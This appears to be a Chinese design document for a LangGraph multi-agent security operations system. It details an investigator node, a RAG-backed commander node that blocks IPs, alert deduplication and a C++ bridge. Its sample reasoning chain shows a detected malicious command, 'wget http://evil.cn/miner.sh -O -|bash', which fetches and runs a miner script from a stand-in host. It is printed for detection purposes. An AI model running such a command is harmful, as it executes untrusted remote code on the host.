# Agent 工作流：LangGraph 多智能体 SOC

Python 控制平面实现了一个**两节点 LangGraph 状态机**，结合 RAG（检索增强生成）和 ReAct（推理+行动）模式，完成从威胁告警到封锁决策的完整闭环。

---

## 1. 工作流总览

```svg
<svg viewBox="0 0 860 520" xmlns="http://www.w3.org/2000/svg" font-family="'Segoe UI',Arial,sans-serif">
  <rect width="860" height="520" fill="#0f1117" rx="10"/>
  <text x="430" y="32" text-anchor="middle" font-size="16" font-weight="bold" fill="#e2e8f0">SOC 多智能体工作流（scripts/multi_agent_soc.py）</text>

  <defs>
    <marker id="wf" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto">
      <polygon points="0 0,8 3,0 6" fill="#c084fc"/>
    </marker>
    <marker id="wf2" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto">
      <polygon points="0 0,8 3,0 6" fill="#6ee7b7"/>
    </marker>
    <marker id="wf3" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto">
      <polygon points="0 0,8 3,0 6" fill="#fbbf24"/>
    </marker>
  </defs>

  <!-- C++ 告警来源 -->
  <rect x="30" y="60" width="155" height="55" rx="8" fill="#064e3b" stroke="#10b981" stroke-width="1.5"/>
  <text x="107" y="81" text-anchor="middle" font-size="12" fill="#6ee7b7" font-weight="bold">C++ 数据平面</text>
  <text x="107" y="97" text-anchor="middle" font-size="10" fill="#34d399">score &gt; 0.95 触发</text>
  <text x="107" y="112" text-anchor="middle" font-size="10" fill="#34d399">JSON-RPC 通知</text>

  <!-- WAF 告警来源 -->
  <rect x="30" y="140" width="155" height="55" rx="8" fill="#1e3a5f" stroke="#3b82f6" stroke-width="1.5"/>
  <text x="107" y="161" text-anchor="middle" font-size="12" fill="#93c5fd" font-weight="bold">WAF 代理</text>
  <text x="107" y="177" text-anchor="middle" font-size="10" fill="#60a5fa">waf_alerts.log</text>
  <text x="107" y="192" text-anchor="middle" font-size="10" fill="#60a5fa">WAFLogMonitor 监控</text>

  <!-- AlertDedup -->
  <rect x="230" y="90" width="155" height="70" rx="8" fill="#2e1065" stroke="#a855f7" stroke-width="2"/>
  <text x="307" y="112" text-anchor="middle" font-size="13" fill="#d8b4fe" font-weight="bold">AlertDedup</text>
  <text x="307" y="129" text-anchor="middle" font-size="10" fill="#c084fc">60s 滑动窗口</text>
  <text x="307" y="145" text-anchor="middle" font-size="10" fill="#c084fc">同IP去重，防LLM超配</text>

  <line x1="185" y1="87" x2="228" y2="115" stroke="#a855f7" stroke-width="1.5" marker-end="url(#wf)"/>
  <line x1="185" y1="167" x2="228" y2="140" stroke="#a855f7" stroke-width="1.5" marker-end="url(#wf)"/>

  <!-- LangGraph START -->
  <circle cx="460" cy="125" r="22" fill="#2e1065" stroke="#a855f7" stroke-width="2"/>
  <text x="460" y="121" text-anchor="middle" font-size="10" fill="#d8b4fe" font-weight="bold">START</text>
  <text x="460" y="135" text-anchor="middle" font-size="9" fill="#c084fc">StateGraph</text>

  <line x1="385" y1="125" x2="436" y2="125" stroke="#a855f7" stroke-width="2" marker-end="url(#wf)"/>

  <!-- investigator_node -->
  <rect x="510" y="60" width="200" height="130" rx="10" fill="#2e1065" stroke="#a855f7" stroke-width="2"/>
  <text x="610" y="82" text-anchor="middle" font-size="13" fill="#d8b4fe" font-weight="bold">investigator_node</text>
  <text x="610" y="100" text-anchor="middle" font-size="10" fill="#c084fc">ReAct 循环</text>
  <rect x="525" y="108" width="170" height="22" rx="4" fill="#1e1040" stroke="none"/>
  <text x="610" y="123" text-anchor="middle" font-size="10" fill="#d8b4fe">get_pid_by_connection</text>
  <rect x="525" y="134" width="170" height="22" rx="4" fill="#1e1040" stroke="none"/>
  <text x="610" y="149" text-anchor="middle" font-size="10" fill="#d8b4fe">analyze_process_behavior</text>
  <rect x="525" y="160" width="170" height="22" rx="4" fill="#1e1040" stroke="none"/>
  <text x="610" y="175" text-anchor="middle" font-size="10" fill="#a855f7">→ investigation_report</text>

  <line x1="482" y1="125" x2="508" y2="125" stroke="#a855f7" stroke-width="2" marker-end="url(#wf)"/>

  <!-- commander_node -->
  <rect x="510" y="230" width="200" height="165" rx="10" fill="#2e1065" stroke="#a855f7" stroke-width="2"/>
  <text x="610" y="253" text-anchor="middle" font-size="13" fill="#d8b4fe" font-weight="bold">commander_node</text>
  <text x="610" y="271" text-anchor="middle" font-size="10" fill="#c084fc">RAG + ReAct</text>
  <rect x="525" y="278" width="170" height="22" rx="4" fill="#1e1040" stroke="none"/>
  <text x="610" y="293" text-anchor="middle" font-size="10" fill="#d8b4fe">FAISS.similarity_search</text>
  <rect x="525" y="304" width="170" height="22" rx="4" fill="#1e1040" stroke="none"/>
  <text x="610" y="319" text-anchor="middle" font-size="10" fill="#d8b4fe">LLM 融合情报决策</text>
  <rect x="525" y="330" width="170" height="22" rx="4" fill="#1e1040" stroke="none"/>
  <text x="610" y="345" text-anchor="middle" font-size="10" fill="#d8b4fe">block_malicious_ip</text>
  <rect x="525" y="356" width="170" height="22" rx="4" fill="#1e1040" stroke="none"/>
  <text x="610" y="371" text-anchor="middle" font-size="10" fill="#a855f7">→ decision</text>

  <!-- investigator → commander -->
  <line x1="610" y1="190" x2="610" y2="228" stroke="#a855f7" stroke-width="2" marker-end="url(#wf)"/>

  <!-- END -->
  <circle cx="610" cy="440" r="22" fill="#2e1065" stroke="#a855f7" stroke-width="2"/>
  <text x="610" y="436" text-anchor="middle" font-size="10" fill="#d8b4fe" font-weight="bold">END</text>
  <text x="610" y="449" text-anchor="middle" font-size="9" fill="#c084fc">StateGraph</text>

  <line x1="610" y1="395" x2="610" y2="416" stroke="#a855f7" stroke-width="2" marker-end="url(#wf)"/>

  <!-- IncidentLogger -->
  <rect x="30" y="380" width="185" height="60" rx="8" fill="#451a03" stroke="#f59e0b" stroke-width="1.5"/>
  <text x="122" y="402" text-anchor="middle" font-size="12" fill="#fcd34d" font-weight="bold">IncidentLogger</text>
  <text x="122" y="418" text-anchor="middle" font-size="10" fill="#fbbf24">按 IP 命名 JSON 文件</text>
  <text x="122" y="434" text-anchor="middle" font-size="10" fill="#fbbf24">持久化事件记录</text>

  <line x1="508" y1="440" x2="215" y2="420" stroke="#f59e0b" stroke-width="1.5" stroke-dasharray="4,2" marker-end="url(#wf3)"/>

  <!-- RAG 知识库 -->
  <rect x="750" y="270" width="100" height="95" rx="8" fill="#1e1040" stroke="#6366f1" stroke-width="1.5"/>
  <text x="800" y="292" text-anchor="middle" font-size="11" fill="#818cf8" font-weight="bold">FAISS</text>
  <text x="800" y="308" text-anchor="middle" font-size="10" fill="#6366f1">威胁情报</text>
  <text x="800" y="324" text-anchor="middle" font-size="10" fill="#6366f1">向量索引</text>
  <text x="800" y="344" text-anchor="middle" font-size="9" fill="#4f46e5">Doubao 嵌入</text>
  <text x="800" y="358" text-anchor="middle" font-size="9" fill="#4f46e5">模型</text>

  <line x1="712" y1="312" x2="748" y2="312" stroke="#6366f1" stroke-width="1.5" marker-end="url(#wf)"/>
  <text x="728" y="305" text-anchor="middle" font-size="9" fill="#818cf8">查询</text>
</svg>
```

---

## 2. LangGraph 状态定义

```python
class SOCState(TypedDict):
    threat_ip: str           # 检测到的威胁 IP
    threat_port: int         # 威胁端口
    investigation_report: str # investigator 产出的分析报告
    decision: str            # commander 产出的封锁决策
```

---

## 3. investigator_node — 调查节点

**职责**: 通过 ReAct 循环查明威胁主机上的可疑进程

```svg
<svg viewBox="0 0 720 320" xmlns="http://www.w3.org/2000/svg" font-family="'Segoe UI',Arial,sans-serif">
  <rect width="720" height="320" fill="#0f1117" rx="8"/>
  <text x="360" y="26" text-anchor="middle" font-size="14" font-weight="bold" fill="#d8b4fe">investigator_node ReAct 执行循环</text>

  <defs>
    <marker id="inv" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto">
      <polygon points="0 0,8 3,0 6" fill="#c084fc"/>
    </marker>
  </defs>

  <!-- LLM -->
  <rect x="270" y="50" width="180" height="55" rx="8" fill="#2e1065" stroke="#a855f7" stroke-width="2"/>
  <text x="360" y="72" text-anchor="middle" font-size="13" fill="#d8b4fe" font-weight="bold">LLM (DeepSeek)</text>
  <text x="360" y="89" text-anchor="middle" font-size="10" fill="#c084fc">推理: 需要哪个工具?</text>
  <text x="360" y="104" text-anchor="middle" font-size="10" fill="#c084fc">观察: 结果是什么?</text>

  <!-- Tool 1 -->
  <rect x="60" y="175" width="215" height="55" rx="8" fill="#451a03" stroke="#f59e0b" stroke-width="1.5"/>
  <text x="167" y="196" text-anchor="middle" font-size="12" fill="#fcd34d" font-weight="bold">get_pid_by_connection</text>
  <text x="167" y="212" text-anchor="middle" font-size="10" fill="#fbbf24">HTTP → C++ MCP :8080</text>
  <text x="167" y="227" text-anchor="middle" font-size="10" fill="#fbbf24">返回: PID=8901</text>

  <!-- Tool 2 -->
  <rect x="440" y="175" width="220" height="55" rx="8" fill="#451a03" stroke="#f59e0b" stroke-width="1.5"/>
  <text x="550" y="196" text-anchor="middle" font-size="12" fill="#fcd34d" font-weight="bold">analyze_process_behavior</text>
  <text x="550" y="212" text-anchor="middle" font-size="10" fill="#fbbf24">HTTP → C++ MCP :8080</text>
  <text x="550" y="227" text-anchor="middle" font-size="10" fill="#fbbf24">返回: cmdline 字符串</text>

  <!-- 箭头 LLM → tools -->
  <line x1="290" y1="105" x2="200" y2="173" stroke="#a855f7" stroke-width="1.5" marker-end="url(#inv)"/>
  <line x1="430" y1="105" x2="520" y2="173" stroke="#a855f7" stroke-width="1.5" marker-end="url(#inv)"/>

  <!-- tools → LLM (观察) -->
  <line x1="167" y1="230" x2="290" y2="110" stroke="#f59e0b" stroke-width="1" stroke-dasharray="4,2" marker-end="url(#inv)"/>
  <line x1="550" y1="230" x2="430" y2="110" stroke="#f59e0b" stroke-width="1" stroke-dasharray="4,2" marker-end="url(#inv)"/>

  <!-- 输出 -->
  <rect x="200" y="265" width="320" height="40" rx="6" fill="#1e1040" stroke="#a855f7" stroke-width="1"/>
  <text x="360" y="282" text-anchor="middle" font-size="11" fill="#d8b4fe">investigation_report</text>
  <text x="360" y="297" text-anchor="middle" font-size="10" fill="#a855f7">威胁进程分析 + MITRE ATT&CK 映射</text>

  <line x1="360" y1="105" x2="360" y2="263" stroke="#a855f7" stroke-width="1.5" stroke-dasharray="4,2" marker-end="url(#inv)"/>
  <text x="375" y="195" font-size="9" fill="#c084fc">最终</text>
  <text x="375" y="207" font-size="9" fill="#c084fc">输出</text>
</svg>
```

**典型推理链**:

```
Thought: 需要查明 10.0.0.5:4444 对应的进程
Action: get_pid_by_connection(ip="10.0.0.5", port=4444)
Observation: {"pid": 8901}

Thought: 有了PID，需要分析进程行为
Action: analyze_process_behavior(pid=8901)
Observation: {"cmdline": "wget http://evil.cn/miner.sh -O -|bash"}

Thought: 发现挖矿木马。符合 MITRE T1105 (下载) + T1059.004 (Unix Shell执行)
Final Answer: [investigation_report 包含 IOC、TTPs、风险评估]
```

---

## 4. commander_node — 决策节点

**职责**: 融合威胁情报（RAG）与调查报告，做出封锁决策

```svg
<svg viewBox="0 0 720 290" xmlns="http://www.w3.org/2000/svg" font-family="'Segoe UI',Arial,sans-serif">
  <rect width="720" height="290" fill="#0f1117" rx="8"/>
  <text x="360" y="26" text-anchor="middle" font-size="14" font-weight="bold" fill="#d8b4fe">commander_node RAG+ReAct 流程</text>

  <defs>
    <marker id="cmd" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto">
      <polygon points="0 0,8 3,0 6" fill="#c084fc"/>
    </marker>
    <marker id="cmd2" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto">
      <polygon points="0 0,8 3,0 6" fill="#818cf8"/>
    </marker>
  </defs>

  <!-- investigation_report 输入 -->
  <rect x="20" y="50" width="160" height="44" rx="6" fill="#1e1040" stroke="#a855f7" stroke-width="1.5"/>
  <text x="100" y="70" text-anchor="middle" font-size="11" fill="#d8b4fe">investigation_report</text>
  <text x="100" y="85" text-anchor="middle" font-size="10" fill="#a855f7">来自 investigator</text>

  <!-- FAISS RAG -->
  <rect x="20" y="130" width="160" height="65" rx="6" fill="#1e1040" stroke="#6366f1" stroke-width="1.5"/>
  <text x="100" y="152" text-anchor="middle" font-size="12" fill="#818cf8" font-weight="bold">FAISS RAG</text>
  <text x="100" y="168" text-anchor="middle" font-size="10" fill="#6366f1">similarity_search(k=2)</text>
  <text x="100" y="184" text-anchor="middle" font-size="10" fill="#6366f1">威胁情报文档检索</text>

  <!-- LLM -->
  <rect x="270" y="80" width="180" height="65" rx="8" fill="#2e1065" stroke="#a855f7" stroke-width="2"/>
  <text x="360" y="102" text-anchor="middle" font-size="13" fill="#d8b4fe" font-weight="bold">LLM (DeepSeek)</text>
  <text x="360" y="119" text-anchor="middle" font-size="10" fill="#c084fc">系统提示: SOC 指挥官</text>
  <text x="360" y="134" text-anchor="middle" font-size="10" fill="#c084fc">输入: 报告 + RAG文档</text>

  <!-- block_malicious_ip -->
  <rect x="520" y="80" width="180" height="65" rx="8" fill="#450a0a" stroke="#ef4444" stroke-width="2"/>
  <text x="610" y="102" text-anchor="middle" font-size="12" fill="#fca5a5" font-weight="bold">block_malicious_ip</text>
  <text x="610" y="119" text-anchor="middle" font-size="10" fill="#f87171">HTTP → C++ MCP</text>
  <text x="610" y="134" text-anchor="middle" font-size="10" fill="#f87171">→ eBPF/iptables 封锁</text>

  <!-- 箭头 -->
  <line x1="180" y1="72" x2="268" y2="110" stroke="#a855f7" stroke-width="1.5" marker-end="url(#cmd)"/>
  <line x1="180" y1="162" x2="268" y2="125" stroke="#6366f1" stroke-width="1.5" marker-end="url(#cmd2)"/>
  <line x1="450" y1="112" x2="518" y2="112" stroke="#a855f7" stroke-width="2" marker-end="url(#cmd)"/>

  <!-- decision 输出 -->
  <rect x="220" y="220" width="320" height="50" rx="6" fill="#1e1040" stroke="#a855f7" stroke-width="1"/>
  <text x="380" y="242" text-anchor="middle" font-size="12" fill="#d8b4fe" font-weight="bold">decision</text>
  <text x="380" y="259" text-anchor="middle" font-size="10" fill="#a855f7">封锁确认 + IOC + 缓解措施 + 误报可能性</text>

  <line x1="360" y1="145" x2="360" y2="218" stroke="#a855f7" stroke-width="1.5" stroke-dasharray="4,2" marker-end="url(#cmd)"/>
</svg>
```

---

## 5. AlertDedup — 去重机制

防止同一 IP 的重复告警在 60 秒窗口内多次触发 LLM 调用：

```python
class AlertDedup:
    def __init__(self, window_seconds=60):
        self.window = window_seconds
        self.seen: dict[str, float] = {}  # ip → last_seen_timestamp
        self.lock = threading.Lock()

    def should_process(self, ip: str) -> bool:
        with self.lock:
            now = time.time()
            if ip in self.seen and now - self.seen[ip] < self.window:
                return False   # 重复，跳过
            self.seen[ip] = now
            return True        # 首次或超时，处理
```

---

## 6. RAG 威胁情报系统

```svg
<svg viewBox="0 0 700 260" xmlns="http://www.w3.org/2000/svg" font-family="'Segoe UI',Arial,sans-serif">
  <rect width="700" height="260" fill="#0f1117" rx="8"/>
  <text x="350" y="26" text-anchor="middle" font-size="14" font-weight="bold" fill="#e2e8f0">RAG 系统构建与检索</text>

  <defs>
    <marker id="rag" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto">
      <polygon points="0 0,8 3,0 6" fill="#818cf8"/>
    </marker>
  </defs>

  <!-- 构建阶段 -->
  <text x="175" y="60" text-anchor="middle" font-size="12" fill="#818cf8" font-weight="bold">【构建阶段 — 启动时一次性】</text>

  <rect x="20" y="72" width="135" height="50" rx="6" fill="#1e1040" stroke="#6366f1" stroke-width="1.5"/>
  <text x="87" y="92" text-anchor="middle" font-size="11" fill="#a5b4fc">威胁情报文本</text>
  <text x="87" y="108" text-anchor="middle" font-size="9" fill="#6366f1">MITRE ATT&amp;CK</text>

  <rect x="185" y="72" width="155" height="50" rx="6" fill="#1e1040" stroke="#6366f1" stroke-width="1.5"/>
  <text x="262" y="92" text-anchor="middle" font-size="11" fill="#a5b4fc">VolcengineEmbeddings</text>
  <text x="262" y="108" text-anchor="middle" font-size="9" fill="#6366f1">doubao-embedding-vision</text>

  <rect x="370" y="72" width="135" height="50" rx="6" fill="#1e1040" stroke="#6366f1" stroke-width="1.5"/>
  <text x="437" y="92" text-anchor="middle" font-size="11" fill="#a5b4fc">FAISS Index</text>
  <text x="437" y="108" text-anchor="middle" font-size="9" fill="#6366f1">向量数据库（内存）</text>

  <line x1="155" y1="97" x2="183" y2="97" stroke="#6366f1" stroke-width="1.5" marker-end="url(#rag)"/>
  <line x1="340" y1="97" x2="368" y2="97" stroke="#6366f1" stroke-width="1.5" marker-end="url(#rag)"/>

  <!-- 检索阶段 -->
  <text x="350" y="150" text-anchor="middle" font-size="12" fill="#818cf8" font-weight="bold">【检索阶段 — 每次告警时】</text>

  <rect x="20" y="162" width="155" height="50" rx="6" fill="#2e1065" stroke="#a855f7" stroke-width="1.5"/>
  <text x="97" y="182" text-anchor="middle" font-size="11" fill="#d8b4fe">investigation_report</text>
  <text x="97" y="198" text-anchor="middle" font-size="9" fill="#c084fc">查询文本</text>

  <rect x="210" y="162" width="155" height="50" rx="6" fill="#1e1040" stroke="#6366f1" stroke-width="1.5"/>
  <text x="287" y="182" text-anchor="middle" font-size="11" fill="#a5b4fc">similarity_search</text>
  <text x="287" y="198" text-anchor="middle" font-size="9" fill="#6366f1">k=2 最近邻</text>

  <rect x="400" y="162" width="145" height="50" rx="6" fill="#2e1065" stroke="#a855f7" stroke-width="1.5"/>
  <text x="472" y="182" text-anchor="middle" font-size="11" fill="#d8b4fe">相关威胁文档</text>
  <text x="472" y="198" text-anchor="middle" font-size="9" fill="#c084fc">注入 commander 上下文</text>

  <line x1="175" y1="187" x2="208" y2="187" stroke="#a855f7" stroke-width="1.5" marker-end="url(#rag)"/>
  <line x1="365" y1="187" x2="398" y2="187" stroke="#a855f7" stroke-width="1.5" marker-end="url(#rag)"/>

  <!-- 说明 -->
  <rect x="20" y="228" width="660" height="22" rx="4" fill="#1e293b" stroke="#334155" stroke-width="1"/>
  <text x="350" y="244" text-anchor="middle" font-size="10" fill="#94a3b8">RAG 接地防幻觉: LLM 决策基于本地威胁情报，而非纯粹的参数记忆</text>
</svg>
```

---

## 7. CppProbeWrapper — IPC 层

**职责**: 管理 C++ 子进程生命周期，桥接 Python ↔ C++ 通信

```python
class CppProbeWrapper:
    def __init__(self, binary_path: str):
        self.process = subprocess.Popen(
            [binary_path],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            env={"LD_LIBRARY_PATH": "third_party/onnxruntime/lib", ...}
        )
        # 守护线程持续读取 C++ stdout（威胁通知）
        threading.Thread(target=self._message_pump, daemon=True).start()

    def call_tool(self, name: str, args: dict) -> dict:
        # 通过 HTTP POST 调用 C++ MCP 工具
        return requests.post(f"http://localhost:{self.mcp_port}/message",
                           json={"jsonrpc": "2.0", "method": "tools/call",
                                 "params": {"name": name, "arguments": args}}).json()
```

| 通信方向 | 机制 | 用途 |
|---------|------|------|
| C++ → Python | stdout JSON-RPC 通知 | 威胁检测告警 |
| Python → C++ | HTTP POST :8080 | 工具调用（PID查询、进程分析、IP封锁） |
